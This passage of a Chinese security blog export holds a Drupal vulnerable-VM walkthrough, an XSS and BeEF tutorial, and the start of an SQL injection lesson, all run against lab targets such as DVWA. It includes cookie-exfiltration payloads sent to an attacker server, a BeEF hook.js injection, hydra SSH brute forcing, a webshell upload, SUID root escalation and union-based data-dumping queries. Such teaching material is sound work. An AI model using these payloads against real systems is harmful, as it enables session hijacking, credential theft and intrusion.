password:R0ck3t\n```\n\n![](https://i.loli.net/2020/05/17/ugkBJPU3d7Hzlnv.png)\n\n查看数据库,在drupaldb库users表中发现admin用户\n\n```mysql\nmysql> show databases; #[drupaldb]\nmysql> use drupaldb;\nmysql> show tables; #[users]\nmysql> select * from users;\n```\n\n![](https://i.loli.net/2020/05/17/SGaPZVomDkRLpA2.png)\n\n![image-20200517095356679](https://i.loli.net/2020/05/17/PFKyEd4zqncsVmC.png)\n\n可以看到admin用户的密码被加密了的，但是我们可以想办法修改密码或新增一个admin权限的用户\n\n**方法一：**修改admin用户的密码\n\n使用Drupal对数据库的加密方法，生成一个新密码，然后把新的密码更新到admin用户\n\n加密脚本位置在`/var/www/scripts/password-hash.sh`下\n\n参考：[忘记Drupal的管理员密码的解决办法](http://drupalchina.cn/node/2128)\n\n```bash\n$ php scripts/password-hash.sh jwt  #生成新密码jwt\n# hash:$S$D5HTFVPccZrLCEJ7CzFvPvvh5zlSRhjF6E7AZ0Wg0R.cDGjgChoX\n\nmysql> update drupaldb.users set pass=\"$S$D5HTFVPccZrLCEJ7CzFvPvvh5zlSRhjF6E7AZ0Wg0R.cDGjgChoX\" where name=\"admin\";\n```\n\n![image-20200517101339236](https://i.loli.net/2020/05/17/Ihmut4gaZNVyBX5.png)\n\n![image-20200517101410076](https://i.loli.net/2020/05/17/q6T9HNAlZUmwFsh.png)\n\n**方法二：**新增一个admin权限的用户\n\n在exploitdb中有一个针对Drupal 7版本的攻击脚本，可以增加一个admin权限的用户账号\n\n\n\n查看Drupal版本,确定Drupal版本为7.24\n\n```bash\n$ cat /var/www/includes/bootstrap.inc | grep VERSION\n```\n\n![image-20200517130545021](https://i.loli.net/2020/05/17/2TnfzyQHIAXkidc.png)\n\n```bash\nmsf > searchsploit drupal\n```\n\n![](https://i.loli.net/2020/05/17/fvSrwXp6Al5BmHz.png)\n\n攻击脚本适用于7.31以下，所以适合7.24版本,可以利用漏洞增加admin权限用户\n\n增加有admin权限的用户：admin1/admin1\n\n```bash\npython /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.0.100 -u admin1 -p admin1\n```\n\n输入用户名/密码【admin/jwt或者admin1/admin1】，尝试登陆 \n\n![](https://i.loli.net/2020/05/17/2ugc4GCWK6pZHfQ.png)\n\n成功登陆\n\n![](https://i.loli.net/2020/05/17/2yNEYavswqhoxJg.png)\n\n\n\n\n\n在后台左上角的`Find content`中发现flag3\n\n![image-20200517102352344](https://i.loli.net/2020/05/17/Pl3E8IFh4SDb6gj.png)\n\n\n\nflag3的信息中提到了passwd和shadow,很明显就是`/etc/passwd和/etc/shadow`，还提到了`find、perms、-exec`，这几个是提权用的。\n\n我们来查看哈/`etc/passwd和/etc/shadow` 的内容\n\n> /etc/passwd 是一个纯文本文件。它存储用户帐户信息。它包含系统帐户的列表，为每个帐户提供一些有用的信息，如用户 ID、组 ID、主目录、shell 等\n>\n>  [/etc/passwd详情](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)\n>\n> etc/shadow是/etc/passwd的影子文件，存有密码信息\n\n```bash\n$ cat /etc/passwd\n或者\n$ tail -3 /etc/passwd  #为了方便截图，只显示文件的最后三行\n\n$ cat /etc/shadow #权限不够查看失败\n```\n\n![](https://i.loli.net/2020/05/17/HonD8RieWJgrS1p.png)\n\n发现有个叫`flag4`的账号，但是查看使用`/etc/shadow`失败，但是前面nmap扫描的时候发现了 ssh 服务，现在又发现了 flag4 用户，所以尝试使用`hydra `进行密码的暴力猜解\n\n```bash\nsudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz 192.168.0.100 ssh\n或者\nsudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.0.100\n\n#ip变成192.168.0.100，是应为我重启了，靶机ip变了\n-l  指定破解的用户\n-P  指定密码字典\nssh://ip 指定使用协议和ip地址\n```\n\n![](https://i.loli.net/2020/05/16/Kb8FI9HYGaqLfkM.png)\n\n[暴力密码在线破解工具Hydra详解](http://www.ha97.com/5186.html)\n\n使用得到用户名密码【 flag4/orange】，登录靶机\n\n![](https://i.loli.net/2020/05/16/6clWopZR2OfKEQb.png)\n\n也可以用kali直接远程连接\n\n```bash\nssh flag4@192.168.0.100\n```\n\n![](https://i.loli.net/2020/05/16/V3eb5srdkzi2fZF.png)\n\n```bash\n$ ls\n$ cat flag4.txt\n```\n\n![](https://i.loli.net/2020/05/17/qmtczhZHVaik3xE.png)\n\nflag4提示flag在root目录下，在`/root`下发现`thefinalflag.txt`，但是没有读取的权限\n\n![](https://i.loli.net/2020/05/17/wLYZhdx39znRMGv.png)\n\n#### 3.上传冰蝎马获取shell\n\n当然你还可以利用meterperter的shell直接上传冰蝎的shell。\n\n```bash\nmeterperter> upload /home/jwt/Desktop/shell.php /var/www/shell.php\n```\n\n然后冰蝎连接就可以了\n\n### 四、提升权限\n\n根据flag3和flag4都提到了find,所以下面我们利用find文件提权\n\n参考：[Linux下用SUID提权](https://blog.csdn.net/qq_36119192/article/details/84872644)、[linux提权-SUID提权](https://blog.csdn.net/qq_40510246/article/details/95939784?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase)、[find命令之exec](https://www.cnblogs.com/huchong/p/9961625.html)\n\n> SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。\n\n```bash\n#查找具有root权限的SUID的文件\n$ find / -perm -u=s -type f 2>/dev/null\n```\n\n![](https://i.loli.net/2020/05/17/oBHRnfd6O9ZrS38.png)\n\n可以看到find命令具有SUID权限，如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。\n\n```bash\n$ touch jwt\n#查找根目录下名为jwt的文件并执行shell\n$ find / -name jwt -exec \"/bin/sh\" \\;\n\n#-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以在分号前面加反斜杠。\n```\n\n![image-20200517113343425](https://i.loli.net/2020/05/17/EGqIUHOpNa6nmVg.png)\n\n可以看到已经成功提权拿到root shell，接下来就来查看最终的flag吧\n\n```bash\ncd /root\nls\ncat thefinalflag.txt\n```\n\n![image-20200517113640702](https://i.loli.net/2020/05/17/yrWDTYFC6hRvUsu.png)\n\n到这里我们就成功获取到了5个flag,并成功走完了整个渗透流程\n\n### 五、总结\n\n1.扫描局域网主机\n\n`sudo arp-scan -l` 参考：[kali之arp-scan](https://blog.csdn.net/weixin_43221560/article/details/90550294)\n\n`sudo netdiscover -i eth0` 参考：[netdiscover用法](https://manpages.debian.org/unstable/netdiscover/netdiscover.8.en.html)\n\n`nmap 192.168.0.0/24`\n\n2.MSF使用\n\n参考：[MSF之命令笔记篇](http://sh1yan.top/2019/07/28/MSF-Command-Notes/)\n\n3.hydra爆破\n\n`sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.0.100`\n\n参考：[暴力密码在线破解工具Hydra详解](http://www.ha97.com/5186.html)\n\n4.suid提权\n\n参考：[Linux下用SUID提权](https://blog.csdn.net/qq_36119192/article/details/84872644)、[linux提权-SUID提权](https://blog.csdn.net/qq_40510246/article/details/95939784?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase)、[find命令之exec](https://www.cnblogs.com/huchong/p/9961625.html)\n\n\n\n## 赞助💰\n\n如果你觉得对你有帮助，你可以赞助我一杯冰可乐！嘻嘻🤭\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["靶场","渗透测试"],"categories":["Web"]},{"title":"浅谈XSS&Beef","url":"/posts/43901.html","content":"\n<center><font color=pink size=8 weigh:500>浅谈XSS&BeEF</font></center>\n\n## 前言\n\n本文章产生的缘由是因为专业老师，让我给本专业的同学讲一哈SQL注入和XSS入门,为了备课，于是产生了这篇文章。\n\n## 一、课程目标\n\n> 听完这节课你能学到些什么👇\n\n\n- [x] 知道什么是Xss\n- [x] 实现最基础的Xss\n- [x] 学会使用Beef Xss工具\n- [x] 了解一些Web安全基本知识\n\n## 二、初识XSS\n\n### 1 什么是XSS攻击\n\n•\tXSS（Cross Site Script），跨站脚本攻击，OWASP Top10之一  \n•\t向网页内嵌入恶意Java script代码\n\n### 2 XSS分类\n\n•\t反射型 -- 前端->后端->前端\n•\t存储型 -- 前端->后端->数据库->前端\n•\tDOM型 -- 前端\n\n### 3 XSS常用攻击手段\n\n- **窃取网页浏览中的cookie值**\n\n当能够窃取到用户 Cookie 从而获取到用户身份时，攻击者可以获取到用户对网站的操作权限，从而查看用户隐私信息。\n\n- **钓鱼欺骗**：\n\n最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者注入钓鱼 JavaScript 以监控目标网站的表单输入。\n\n- **网站挂马**\n\n跨站时利用 IFrame 嵌入隐藏的恶意网站或者将被攻击者定向到恶意网站上，或者弹出恶意网站窗口等方式都可以进行挂马攻击。\n\n- **垃圾信息发送**\n\n比如在 SNS 社区中，利用 XSS 漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。\n\n- **劫持用户 Web 行为**\n\n一些高级的 XSS 攻击甚至可以劫持用户的 Web 行为，监视用户的浏览历史，发送与接收的数据等等。\n\n- **XSS 蠕虫**\n\nXSS 蠕虫可以用来打广告、刷流量、挂马、恶作剧、破坏网上数据、实施 DDoS 攻击等。\n\n## 三、初试XSS\n\n### 1 XSS初体验\n\n往DVWA靶场插入下方JS，会弹框\n\n```javascript\n<script>alert(\"Hi!我是简简\")</script>;\n```\n\n当然还可以嵌入HTML和CSS,但是用处不大\n\n\n```javascript\n<img src=x onerror='alert(\"hey!\")'>;\n\n<h1>Hi!我是简简</h1><style>h1{color:pink; text-align:center}<style>\n\n<img src='https://jwt1399.top/medias/avatar.png' width=200px;height:200px;/>\n```\n\n其他操作\n\n```javascript\n<svg/onload=alert(1)>   //onload是指在加载该页面时就执行，然后观察是否有弹窗。\n\n#获取cookie\n<script>alert(document.cookie)</script>;\n\n#页面跳转\n<script>window.location.href=\"https://jwt1399.top\";</script>\n```\n\n### 2 利用Xss获取cookie绕过登录验证\n\n>web服务所使用的HTTP服务是无状态的。这就意味着，服务器无法分辨收到的请求是属于哪一个用户的，\n>需要通过cookie来对用户的身份进行标识了，用户每次对服务器发起请求时，都带上自己独有的cookie，服务器通过读取cookie信息，识别用户。\n\n1、首先打开1号浏览器，输入账号和密码登录DVWA,然后获取cookie\n\n方法一：XSS平台\n\n```javascript\n<script src=http://xss.fbisb.com/ij7V></script>\n```\n\n方法二：自己搭建接收平台\n\n**cookie.php**（上传到自己服务器）\n\n```php\n<?php\n$cookie = $_GET['cookie'];\nfile_put_contents('cookie.txt',$cookie);\n?>\n```\n\n**payload:**\n\n```javascript\n<script>document.location=\"http://服务器ip/cookie.php?cookie=\"+document.cookie</script>\n```\n\n获取到的 cookie 存储在 cookie.txt 中\t\n\n方法三：BeEF获取\n\n2、然后打开2号路浏览器，进入到DVWA的login页面，在该页面利用cookie插件将cookie替换为我们获取到的1号浏览器的cookie，然后在URL栏中删掉login.php再回车\n\n3、最后就可以发现未用登陆账号密码就进入了页面\n\n值得注意的是：当对方进行正常logout后，再次使用该cookie是不能成功的。同时在进行替换后须在URL中进行稍许修改，因为所属的cookie不同于一个页面。\n\n## 四、BeEF\n\n> 全称是 The Browser Exploitation Framework.  web框架攻击平台，专注于利用浏览器漏洞.BeEF是我见过的最好的xss利用框架，他同时能够配合metasploit进一步渗透主机，强大的有些吓人！！!\n\n### 安装\n\n#### docker安装\n\ndocker安装得先配置docker环境\n\n```bash\ndocker search beef\ndocker pull janes/beef #拉取beef镜像\ndocker images\ndocker run --rm -p 3000:3000 janes/beef #映射到本机的3000端口\n```\n\n#### Ubuntu\n\n```bash\n#安装依赖\nsudo apt-get update\nsudo apt-get install curl git\ncurl -sSL https://raw.githubusercontent.com/wayneeseguin/rvm/master/binscripts/rvm-installer | bash -s stable\nsource ~/.rvm/scripts/rvm\nrvm install ruby-2.3.0\nrvm use 2.3.0 --default\ngem install bundle\n#安装beef\ngit clone git://github.com/beefproject/beef.git\ncd beef\nbundle install\nruby beef\n```\n\n#### Kali安装\n\n老版本的Kali自带beef,但是新版的没有\n\n```bash\napt-get update\napt-get install beef-xss\n#第一次启动会让你设个密码(jwt)，账号为beef  #可以在/usr/share/beef-xss/config.yaml中修改\n```\n\n### 基础使用\n\n安装好之后在浏览器访问:`ip:3000/ui/panel` 默认用户名和密码都为`beef`\n\n![](https://i.loli.net/2020/05/04/CHwf3xEuWYKyhms.png)\n\n![](https://i.loli.net/2020/05/04/sWqRwDvHuOS2TzU.png)\n\n默认hook js：http://ip:3000/hook.js\n\n默认hook页面： http://ip:3000/demos/basic.html 　　//访问即可被hook\n\n往存在XSS漏洞的地方插入以下代码\n\n```\n<script src='ip:3000/hook.js'></script>;\n```\n\n**举个例子**🌰：往DVWA靶场插入xss代码\n\n```javascript\n<script src='http://139.224.112.182:3000/hook.js'></script>;\n```\n\n![](https://i.loli.net/2020/05/04/IDpXHhNgZJVj4Mu.png)\n\n那么在beef上可以看到被嵌入hook.js的浏览器已经上线了\n\n![](https://i.loli.net/2020/05/04/tFSVqrnH6mp2GQN.png)\n\n然后你可以选择各种攻击模块进行操作了\n\n![](https://i.loli.net/2020/05/04/M3doFeh2rwPHmQW.png)\n\n\n\n每个模块前面的颜色代表着不同的意义\n\n![](https://i.loli.net/2020/05/04/XCh2YvfkxbJrOGR.png)\n\n### 实用攻击模块\n\n使用下面模块的前提是你使用`<script src='http://139.224.112.182:3000/hook.js'></script>;`控制了浏览器。\n\n#### 被控浏览器弹框\n\n> **模块：Browser--->Hooked Domain--->Create Alert Dialog**\n\n![](https://i.loli.net/2020/05/04/rDFmLV2HU3XlnWY.png)\n\n![](https://i.loli.net/2020/05/04/Tb6ZRycfjphB1XG.png)\n\n#### 获取cookie\n\n> **模块：Browser--->Hooked Domain--->Get Cookie**\n\n![](https://i.loli.net/2020/05/04/h2pQ8nXkMHLKlDR.png)\n\n#### 重定向\n\n> **模块：Browser--->Hooked Domain--->Redirect Browser**\n\n将当前页面重定向至指定页面，有可能导致当前权限丢失\n\nRediret Browser(iframe)模块：将当前页面重定向至指定页面，同时保留当前连接，可以维持当前浏览器权限\n\n方法：右侧填写木马的路径，可以配合插件升级攻击\n\n![](https://i.loli.net/2020/05/04/YMiFKypA2QGOHX5.png)\n\n![](https://i.loli.net/2020/05/04/kjQKT1pZLO9No4z.png)\n\n#### 社工弹窗\n\n> **模块：Social Engineering ---> Pretty Theft**\n\n弹出一个登录框，用户输入密码点击登录之后，beef可以获取到密码\n\n![](https://i.loli.net/2020/05/04/yOdzaUkAL3TiGZ8.png)\n\n![](https://i.loli.net/2020/05/04/WOGD9JBZKQ8fuaI.png)\n\n![](https://i.loli.net/2020/05/04/pLzr2fen1ivJqGI.png)\n\n#### 社会工程学攻击\n\n> **模块：Social Engineering ---> Fake Flash Update**\n\n在社工这一栏，可以选择flash更新这类功能来诱使用户升级Flash，当用户点击之后，会下载我们的恶意文件执行，这样我们就可以用c2(command&control)控制用户的系统.\n\n![](https://i.loli.net/2020/05/04/SnuIYFDLHN2AcB9.png)\n\n\n![](https://i.loli.net/2020/05/04/wZA7CjqGIWU5YNi.png)\n####  持久化\n\n> **模块：Persistence--->Create Foreground iFrame**\n\n使用之后，被控浏览器无论点击哪里，都无法跳转到该系统到其他页面\n\n![](https://i.loli.net/2020/05/04/qEusjtYSDMWgali.png)\n\n\n\n#### 内网扫描\n\n> **模块：Network--->Port Scanner**\n\nNetwork用于收集内网信息，比如ping、端口扫描\n\n#### 注入隐藏的iframe框架\n\n> **Misc --> Create Invisible Frame**\n\n### 其他模块\n\n#### Simple Hijacker模块\n\n劫持网页上面的所有链接，当用户点击任意链接时弹出诱骗消息，如果用户接着点击会跳转到指定域名\n\n#### Clippy模块\n\n创建一个浏览器助手提示用户点击\n\n#### TabNabbing模块\n\n当检测用户不在当前页面时启动定时器，倒计时结束后自动重定向至指定页面\n\n#### Clickjacking模块\n\n可以使用multi-click clickjacking，判断当前用户鼠标位置，在不同位置可触发不同JS代码如图，鼠标后面跟随一个iframe\n\n#### Create Pop Under模块\n\n创建一个新窗口\n\n#### Confirm Close Tab模块\n\n当用户关闭当前页面时，反复弹出确认是否关闭页面的消息\n\n### hook手机\n\n由于手机打开网址持续的时间很短，关闭当前页面后BeEF的shell就会下线，因此我们可以使用BeEF API，用户上线后能够自动执行批量命令，结合Persistence模块能够极大提高shell存活时间。除了与windows系统相关的信息无法获取，其他操作均能成功执行，并且BeEF为手机劫持提供了专门的模块系列——**Phonegap**\n\n```\n1、弹框\n2、重定向 \n3、查看是否访问过某些网站\n4、Creates an invisible iframe\n5、Social Engineering系列，如下图，仅作演示 \n6、msf系列\n7、NetWork系列，可以用来扫描同一内网下的windows主机\n```\n\n参考：\n\n[Beef安装与简单使用](https://www.cnblogs.com/ssooking/p/6036494.html)\n\n## 五、修复建议\n\n- 将用户所提供的内容输入输出进行过滤。可以运用下面这些函数对出现XSS漏洞的参数进行过滤：\n- PHP的htmlentities()或是htmlspecialchars()\n- Python的cgi.escape()\n- ASP的Server.HTMLEncode()\n- ASP.NET的Server.HtmlEncode()或功能更强的Microsoft Anti-Cross Site Scripting Library\n- Java的xssprotect(Open Source Library)\n- Node.js的node-validator\n\n## 六、XSS靶场\n\n### DVWA\n\n#### Xss(reflected)-Low\n\n点击右下角的view source，查看源码\n\n![](https://i.loli.net/2020/05/12/RikyZUWGxE1g3cw.png)\n\n**分析：**\n```arrary_key_exists()函数：判断$_GET的值中是否存在“name”键名。并且$_GET[‘name’]的值是否不为空，满足这些条件，直接输出下面的输出语句。可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。```\n\n**`payload：<script>alert('简简')</script>`**\n\n\n\n#### Xss(reflected)-Medium\n\n源码：\n\n![](https://i.loli.net/2020/05/12/frRTuiw9bovlFax.png)\n\n**分析：**\n这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的`<script>`转化为空。然后在将name值的结果输出，这种防护机制是可以被轻松绕过的。\n\n**1**.大小写混淆绕过（str_replace()函数不太完美，因为它区分大小写）\n\n**`Payload：<ScRipt>alert('简简')</script>`**\n\n**`Payload：<SCRIPT>alert('简简')</SCRIPT>`**\n\n**2**.双写绕过\n\n**`Payload：<sc<script>ript>alert('简简')</script>`**\n\n**3**.构造不使用`<script>`标签进行绕过\n\n**`payload：<img src=1 onerror=alert('简简')>`**\n\n解释：<img ..>标签是添加一个图片，src是指定图片的url，onerror是指定加载图片时如果出现错误则要执行的事件,这里我们的图片url肯定是错误的，这个弹框事件也必定会执行\n\n#### Xss(reflected)-High\n\n源码：\n\n![](https://i.loli.net/2020/05/12/51q3sPZvMljNBbx.png)\n\n**分析：**\nHigh级别的代码同样使用黑名单过滤输入，preg_replace() 函数将包含<script的字符，不管大小写，不管后面跟着1个或多个与之相同的字符都转换为空。用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。\n**`Payload：<img src=1 onerror=alert('简简')>`**\n\n#### XSS(Stored)-Low\n\n![](https://i.loli.net/2020/04/03/DcoxeTjLSVKM8yp.png)\n\n相关函数介绍：\n```php\ntrim(string,charlist) 函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括\\0、\\t、\\n、\\x0B、\\r以及空格，可选参数charlist支持添加额外需要删除的字符。\n\nmysqli_real_escape_string(string,connection) 函数会对字符串中的特殊符号（\\x00，\\n，\\r，\\，'，\"，\\x1a）进行转义。\n\nstripslashes(string) 函数删除字符串中的反斜杠。\n```\n**分析**：\n可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。\n\n**Exploit**\nmessage栏的利用：\n输入`<script>alert(/name/)</script>`，成功弹框：\n\n<img src=\"https://i.loli.net/2020/04/03/kl6X5ZIAvjBWzT1.png\"/>\n\n**name栏的利用：**\n发现前端html中对name有字数长度限制:\nBurpsuite 抓包改为`<script>alert(/name/)</script>`\n\n![image-20200403140251503.png](https://i.loli.net/2020/04/03/qtpc7elTUKoD894.png)\n\n点击Bp中Forward 后，成功弹窗：\n\n![image-20200403140311971](https://i.loli.net/2020/04/03/wa4g3N1nstOobRM.png)\n\n#### XSS(Stored)-Medium\n\n![image-20200403140334188](https://i.loli.net/2020/04/03/7tPfxlAo6anS2Bq.png)\n\n```php\nstrip_tags()函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用<b>标签。\n\naddslashes()函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。\n```\n**分析**：\n可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了`<script>`字符串，仍然存在存储型的XSS。\n\n**Exploit**\n**1**.双写绕过\nBurpsuite抓包改name参数为:`<sc<script>ript>alert(/name/)</script>`\n\n![image-20200403140440550.png](https://i.loli.net/2020/04/03/brcmMd2n3wCIBFo.png)\n\n**2**.大小写混淆绕过\n\nBurpsuite抓包改name参数为:`<ScRipt>alert(/name/);</ScRipt>`\n\n<img src=\"https://i.loli.net/2020/04/03/7tVsywGdQLOuKDY.png\" alt=\"image-20200403140456913\"  />\n\n**3.**使用非 script 标签的 xss payload：\n\neg:img标签：\n\nBurpsuite抓包改name参数为:`<img src=1 onerror=alert(/name/)>`\n\n![image-20200403140509371.png](https://i.loli.net/2020/04/03/P48rwRItdYovXSB.png)\n\n其他标签和利用还有很多很多….\n以上抓包修改数据Forward后，均成功弹窗：\n![image-20200403140524097.png](https://i.loli.net/2020/04/03/TnSMldjIgxtvXqm.png)\n\n#### XSS(Stored)-High\n\n![image-20200403140538783.png](https://i.loli.net/2020/04/03/rhBgMw4HaE8UQCn.png)\n\n**分析**：\n这里使用正则表达式过滤了`<script>`标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。\n\n**Exploit**\nBurpsuite抓包改name参数为`<img src=1 onerror=alert(/name/)>`\n![image-20200403140643833.png](https://i.loli.net/2020/04/03/qIta128pKgxW4NR.png)\nForward后，成功弹窗：\n![image-20200403140524097.png](https://i.loli.net/2020/04/03/TnSMldjIgxtvXqm.png)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["XSS"],"categories":["Web"]},{"title":"SQL注入从入门到进阶","url":"/posts/32179.html","content":"<center><font color=pink size=8 weigh:500>SQL注入从入门到进阶</font></center>\n\n本文章产生的缘由是因为专业老师，让我给本专业的同学讲一哈SQL注入和XSS入门，也就是本文的入门篇，讲完两节课后，发现自己对于SQL注入的理解也就仅仅局限于入门，于是有了进阶章节的产生。\n\n# 入门篇\n\n## 一、课程目标\n\n> 听完这节课你能学到些什么👇\n\n\n- [x] 知道什么是Sql注入\n- [x] 实现最基础的Sql注入\n- [x] 学会使用SqlMap工具\n- [x] 了解一些Web安全基本知识\n\n## 二、初识SQL注入\n\n### 1 什么是SQL\n\n> SQL（Structured Query Language） 是用于`访问和处理数据库`的标准的计算机语言,SQL与数据库程序协同工作，比如 SQL Server、MySQL、Oracle、SQLite、MongoDB、PostgreSQL、MS Access、DB2以及其他数据库系统。\n\n![2020年5月](https://i.loli.net/2020/05/02/OxEr91piQSkj7Mc.png)\n\n**SQL执行流程**\n\n![](https://i.loli.net/2020/05/02/k1MB6fsTlyzXH9J.jpg)\n\n###  2 什么是SQL注入\n\n> SQL注入是指web应用程序对**用户输入数据的合法性没有判断或过滤不严**，攻击者可以在web应用程序中事先定义好的查询语句的结尾上**添加额外的SQL语句**，以此来实现欺骗数据库服务器**执行非授权的任意查询**，从而得到相应的数据信息。\n\n**通俗来说：**OWASP Top10之一，SQL注入是通过将`恶意的SQL语句`插入到Web应用的输入参数中，`欺骗服务器`执行恶意的SQL命令的攻击。\n\n**SQL注入流程**\n\n![](https://i.loli.net/2020/05/02/Ligwo95FqyQaHcV.png) \n\n### 3 SQL注入分类\n\n**根据SQL数据类型分类**\n\n- 整型注入\n- 字符型注入\n\n**根据注入的语法分类**\n\n- 联合查询注入（Union query SQL injection）\n- 报错型注入（Error-based SQL injection）\n- 布尔型注入（Boolean-based blind SQL injection）\n- 延时注入（Time-based blind SQL injection）\n- 多语句查询注入 （Stacted queries SQL injection）\n\n##  三、初试SQL注入\n\n### 1 手工注入常规思路\n\n**1.判断是否存在注入，注入是字符型还是数字型** \n2.猜解 SQL 查询语句中的字段数\n3.确定显示的字段顺序 \n4.获取当前数据库 \n5.获取数据库中的表 \n6.获取表中的字段名 \n7.显示字段信息\n\n\n\n![手工注入流程](https://img.jwt1399.top//img/20200608143317.png)\n\n### 2 实现完整手工注入\n\n**靶机：DVWA**\n\n将DVWA的级别设置为low，可以看到源码中是一句简单的查询语句，没有进行任何过过滤\n\n```sql\n$query  = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\n```\n因此我们完全可以插入自己想要执行的sql语句，那么我们开始吧！\n\n输入我们输入1，那么执行的语句就是\n\n`SELECT first_name, last_name FROM users WHERE user_id = '1'`\n\n#### 1.判断注入是字符型还是数字型\n\n> 字符型和数字型最大区别: 数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的\n\n数字型：select * from table where id =$id\n\n字符型：select * from table where id='$id'\n\n判断数字型\n\n```sql\n1 and 1=1 #永真式   select * from table where id=1 and 1=1\n1 and 1=2 #永假式   select * from table where id=1 and 1=2\n#if页面运行错误，则说明此Sql注入为数字型注入。\n```\n\n判断字符型\n\n```sql\n1' and '1'='1  \n\n1' and '1'='2 \n#if页面运行错误，则说明此 Sql 注入为字符型注入。\n```\n\n执行上面两种方式一种就可得出结论，显示这个是字符型注入\n\n#### 2.猜解SQL查询语句中的字段数\n\n```sql\n1' or 1=1 order by 1 #    查询成功  【order by x 对第几列进行排序】1'  order by 1 #  id=‘1‘  #’ 注释\n1' or 1=1 order by 2 #    查询成功\n1' or 1=1 order by 3 #    查询失败\n```\n\n![](https://img.jwt1399.top//img/20200726161444.png)说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。\n\n#### 3.确定显示的字段顺序\n\n```sql\n1' union select 1,2 #    \n```\n\n![](https://i.loli.net/2019/07/07/5d2157a15b62731652.png)\n说明执行的SQL语句为select First name,Surname from xx where ID='id'\n\n**理解select 1,2**：例如一个网站的参数传递执行的查询有3个字段，很可能这些字段不是都显示在网页前端的，假如其中的1或2个字段的查询结果是会返回到前端的，那么我们就需要知道这3个字段中哪两个结果会回显，这个过程相当于找到数据库与前端显示的通道。如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试，这时候我们利用一个简单的select 1,2,3，根据显示在页面上的数字就可以知道哪个数字是这个“通道”，那么我们只需要把这个数字改成我们想查询的内容（如id,password），当数据爆破成功后，就会在窗口显示我们想要的结果。[SELECT 1,2,3...的含义及其在SQL注入中的用法](https://blog.csdn.net/weixin_44840696/article/details/89166154)\n\n#### 4.获取当前数据库\n\n上步知道字段显示顺序，那我们在字段2的位置上显示数据库试试\n\n```sql\n1' union select 1,database() #\n```\n![](https://i.loli.net/2019/07/07/5d215880225ab67916.png)\n说明当前的数据库为dvwa。\n\n#### 5.获取数据库中的表\n\n```sql\n1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #\n\n1' union select 1,table_name from information_schema.tables where table_schema='dvwa' #\n\n```\n\n**information_schema.tables**存储了数据表的元数据信息，下面对常用的字段进行介绍：\n\n- table_schema: 记录**数据库名**；\n- table_name: 记录**数据表名**；\n- engine : 存储**引擎**；\n- table_rows: 关于表的粗略行估计；\n- data_length : 记录**表的大小**（单位字节）；\n- index_length : 记录表的**索引的大小**；\n- row_format: 可以查看数据表**是否压缩**过；\n\n![](https://img.jwt1399.top//img/20200726161522.png)\n\n说明数据库dvwa中一共有两个表，guestbook与users。\n\n#### 6.获取表中的字段名\n\n```sql\n1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #\n```\n\n![](https://img.jwt1399.top//img/20200726161553.png)\n\n说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login\n\n#### 7.获取字段信息\n\n```sql\n1' union select group_concat(user_id,first_name),group_concat(password) from users #\n\n1' union select group_concat(concat_ws(':',first_name,password)),2 from users #\n\n1' union select first_name,password from users #\n```\n\n![](https://i.loli.net/2019/07/07/5d21587feccc627920.png)\n\n这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。\n\n### 3 实战演练一哈\n\n就以我自己搭建的[靶机](http://139.224.112.182:8801/)为例子🌰\n\n在主页搜索框发现注入点，话不多说开始注入\n\n```sql\n#判断注入类型 #【数字型】\n1 and 1=1 \n1 and 1=2 \n\n#查询数据库 #【test】\n-1 union select 1,2,database()\n\n#获取数据库中的表 #【admin、news】\n-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='test' \n\n#获取表中的字段名 #【 user_id、user_name、user_pass】\n-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='admin'\n\n#获取字段信息 